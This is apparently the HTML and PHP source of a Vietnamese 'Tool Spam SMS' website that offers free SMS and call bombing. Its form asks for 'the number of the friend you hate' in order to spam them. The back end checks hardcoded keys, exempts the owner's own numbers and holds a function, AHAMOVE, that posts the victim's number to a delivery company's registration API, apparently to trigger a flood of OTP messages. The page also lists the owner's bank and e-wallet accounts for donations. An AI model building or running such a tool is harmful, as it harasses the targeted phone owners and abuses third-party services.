...
<html lang="vi">
  <head>
    ...
    <title>Tool Spam Sms - Công Cụ Spam Tin Nhắn Và Cuộc Gọi Miễn Phí</title>
    <meta name="keywords" content="Tool spam sms, spam call free, Spam SMS Free, tool spam sms qkhaispamsms, spam call sms, Web spam sms" />
    <meta name="description" content="Tool Spam Gọi Tin Nhắn Đến Thằng Bạn Ghét Online" />
    <meta name="monetag" content="4ccb4741c04ba885cf9b8e1c3d1fd59a">
    <link rel="shortcut icon" href="https://yt3.ggpht.com/6eP6GbITOzvZOzpWV6ZcGUWgYc4gB3E4kujLQsOH2CMdJgUV0dsXd-7vLVcOUPJNKqPCfzz3tw=s108-c-k-c0x00ffffff-no-rj" type="image/x-icon" />
  ...
  <div class="LoaderCover">
    <div class="Loader">
      ...
      <br />
      <br />
      <h2 class="NameFtThanhDieu">ϟ&ensp;Đang spam...</h2>
    </div>
  </div>
  ...
  <body class="nk-body npc-invest bg-lighter dark-mode">
    <div class="nk-wrap">
        ...
        <div class="container-xl">
          <div class="nk-header-wrap link-between">
            ...
            <div class="nk-header-brand">
              <a href="/index.php" class="logo-link text-base">
                <img src="https://yt3.ggpht.com/6eP6GbITOzvZOzpWV6ZcGUWgYc4gB3E4kujLQsOH2CMdJgUV0dsXd-7vLVcOUPJNKqPCfzz3tw=s108-c-k-c0x00ffffff-no-rj" class="hide-mb-sm" />Công Cụ Spam Sms </a>
            </div>
            <div class="nk-header-tools nk-header-menu" data-content="headerNav">
              ...
              <ul class="nk-menu nk-menu-main">
                <li class="nk-menu-item">
                  <a href="/index.php" class="nk-menu-link nk-ibx-action-item" data-original-title="" title="">
                ...
                <li class="nk-menu-item">
                  <a href="https://checkscamdls.info/tools/freeid" class="nk-menu-link nk-ibx-action-item" data-original-title="" title="">
                    <em class="fa fa-slideshare"></em>
                    <span class="nk-menu-text">
                      <font style="vertical-align: inherit;">
                        <font style="vertical-align: inherit;">&ensp;Apple Id</font>
                      </font>
                    </span>
                  </a>
                </li>
          ...
          <div class="card card-preview">
            <div class="card-inner mt-3">
              <div class="nya-title nk-ibx-action-item progress-rating">
                <span class="nk-menu-text font-weight-bold">
                  <font style="vertical-align: inherit;">Tool Spam Cuộc Gọi Tin Nhắn Free</font>
                  </font>
                </span>
              </div>
              <form id="vtd-saveform" method="post">
                <div class="vtd-form-group">
                  <label class="form-label" for="phone">
                    <font style="vertical-align: inherit;">
                      <font style="vertical-align: inherit;">Nhập số điện thoại thằng bạn ghét để spam chết cụ nó</font>
                    </font>
                  </label>
                  <div class="form-control-wrap">
                    <input onkeypress="return isNumberKey(event)" type="number" id="phone" name="phone" placeholder="Ví dụ : 0123456789" class="form-control form-control-lg" required />
                  </div>
                </div>
                <div class="vtd-form-group">
                  ...
                  <select class="form-control" id="chon_server" name="ten_server">
                    <option value="">Server-Version1 ( Mặc Định )</option>
                    <option value="Server-IPv2">Server-Version2 ( Tấn Công Ổn Định )</option>
                ...
                <div class="vtd-form-group">
                  ...
                  <div class="form-control-wrap">
                    <input type="password" id="key" name="key" required placeholder="Ví dụ : 123-ххх" class="form-control form-control-lg" />
                            ...
                            window.addEventListener('DOMContentLoaded', (event) => {
                              fetch('https://api.ipify.org?format=json')
                                ...
                                .then(data => {
                                  ...
                                  result.innerHTML = "Địa chỉ IP của bạn: " + ipAddress;
                                })
                                .catch(error => {
                                  console.log(error);
                                });
            ...
            <div class="border mt-4">
              <div class="card-inner">
                <h6>
                  <i class="fa fa-info-circle"></i> Lưu ý cho người mới
                </h6>
                <div class="accordion-inner">
                  <span style="color: #0099ff;">⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯</span><br />
                  • <a style="color: #6666FF;" >HOT</a> Server Version1 - Version2 đang mở miễn phí <br />
                  • Sau khi spam xong nếu bạn không sử dụng nữa thì vui lòng đóng tab trang webs này. <br /> 
                  • Nếu thấy spam không ổn định thì hãy tải lại trang (F5). <br />
                  • Khi đang spam vui lòng không thoát trang web.<br />
                  <span style="color: #00ee00;">⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯</span>
                  <br /> ⌜Bấm bắt đầu nếu thấy website xoay mãi ở loading thì đã spam thành công.⌟ <br />
                   ⌜Nếu có lỗi gì hãy nhắn tin tui.⌟ <br />
                   ⌜Mọi thứ đều miễn phí cho mọi người. Chừng nào tui hết tiền thì tui sẽ tính tiếp.⌟ <br />
            ...
            <div class="border mt-4">
              <div class="card-inner">
                <h6>
                  <i class="fa fa-info-circle"></i> Donate để admin có thể duy trì website
                </h6>
                <div class="accordion-inner">
                  <span style="color: #0099ff;
                  ">⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯</span><br />
                  • <a style="color: #6666FF;" >Thông Báo<br/></a> • MOMO: 0352876128<br />
                  • CTK: Bùi Quang Khải<br /> 
                  • Mbbank: 05052008567890<br />
                  • CTK: BUI QUANG KHAI<br />
      ...
      <div class="mt-5 text-center">
        ...
        <a href="/index.php" title="Về trang chủ tải xuống" class="btn btn-sm btn-outline-light">
                ...
                <div class="container-xl">
                    <div class="nk-footer-wrap">
                        <div class="nk-footer-copyright">
                            <font style="vertical-align: inherit;">
                                <font style="vertical-align: inherit;">© Thiết kế by BuiQuangKhai 🚀</font>
                                <br />
                                <font style="vertical-align: inherit;">Support Qua Facebook <a href="https://www.facebook.com/buiquangkhai.user4/" ><u>Tại đây</u></a></font>
                            </font>
                        </div>
                    </div>
                </div>
        ...
        <script src="nioapp.min.js"></script>
...
if(isset($_POST["key"])){
	...
	if($key == "khaidev" or $key == "0903" or $check["status"] == "success"){/*
		...
		if(isset($_POST["phone"])){
            ...
            echo "<style>.swal2-title{color: #fff !important;font-size: 2rem;}</style><script>Swal.fire('Kết quả', 'Spam Server API Quang Khải - Thành công: 0 - Thất bại: 0 -  Vui Lòng Nhập Đúng Số Phone', 'error')</script>";; exit;; exit;
		}
	} else {
		echo "<style>.swal2-title{color: #fff !important;font-size: 2rem;}</style><script>Swal.fire('Kết quả', 'Spam Server API Quang Khải - Thành công: 0 - Thất bại: 0 -  Key Sai', 'error')</script>";; exit;
	}
}
if(strlen($sdt) < 10){
	echo "<style>.swal2-title{color: #fff !important;font-size: 2rem;}</style><script>Swal.fire('Kết quả', 'Spam Server API Quang Khải - Thành công: 0 - Thất bại: 0 -  Vui Lòng Nhập Đúng Số Phone', 'error')</script>";; exit;; exit;
    ...
    echo "<style>.swal2-title{color: #fff !important;font-size: 2rem;}</style><script>Swal.fire('Kết quả', 'Spam Server API Quang Khải - Thành công: 0 - Thất bại: 0 -  Vui Lòng Nhập Đúng Số Phone', 'error')</script>";; exit;; exit;
} else if($sdt == "BLABLA" or $sdt =="84877760175" or $sdt == "0877760175"){
	echo "<style>.swal2-title{color: #fff !important;font-size: 2rem;}</style><script>Swal.fire('Kết quả', 'Spam Server API Quang Khải - Thành công: 0 - Thất bại: 0 -  Số đã được cấp anti spam ở web này !', 'error')</script>";; exit;; exit;
}
echo "<style>.swal2-title{color: #fff !important;font-size: 2rem;}</style><script>Swal.fire('Kết quả', 'Spam Server API Quang Khải - Thành công: 0 - Thất bại: 0', 'success')</script>";;
...
function AHAMOVE($sdt) {
   ...
   $data = [
	...
	$get = CURL("POST", "https://api.ahamove.com/api/v3/public/user/register", $data, $headers, false);
